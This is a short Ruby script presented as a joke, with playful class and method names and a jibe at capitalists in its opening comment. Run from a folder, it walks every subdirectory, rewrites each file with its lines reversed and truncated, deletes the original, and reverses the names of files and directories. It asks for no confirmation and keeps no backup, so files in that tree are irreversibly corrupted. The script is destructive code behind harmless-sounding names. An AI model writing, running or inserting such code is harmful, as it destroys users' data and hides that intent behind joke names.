#!/usr/bin/ruby

# fun fact: capitalists have no sense of humor.

require "find"

class Jokes
  def initialize
    @selfst = File.stat($0)
  end

  def lose(d)
    Find.find(d) do |itm|
      st = File.stat(itm) rescue nil
      b = File.basename(itm)
      next if ((b == ".") || (b == ".."))
      Find.prune if (File.directory?(itm) && ((b.length > 2) && (b[0] == ".")))
      next if ((not st) || (st == @selfst) || %w(README.txt .gitignore).include?(b))
      yield itm
    end
  end

  def cabaret(path)
    b = File.basename(path)
    e = File.extname(path)
    s = File.basename(b, e)
    d = File.dirname(path)
    tf = File.join(d, "tmp." + b)
    of = File.join(d, s.reverse + e)
    begin
      File.open(tf, "wb") do |ofh|
        File.open(path, "rb") do |infh|
          infh.each_line do |ln|
            ofh.puts(ln[0 .. -2].reverse)
          end
        end
      end
    ensure
      File.delete(path) rescue nil
      (File.rename(tf, of) if File.file?(tf)) rescue nil
    end
  end

  def funny
    aud = []
    lose(".") do |path|
      $stderr.printf("%p ...\n", path)
      if File.file?(path) then
        cabaret(path)
      else
        aud.push(path)
      end

    end
    aud.sort.reverse.each do |path|
      b = File.basename(path)
      d = File.dirname(path)
      nb = File.join(d, b.reverse)
      File.rename(path, nb)
    end
  end
end

begin
  Jokes.new.funny
end
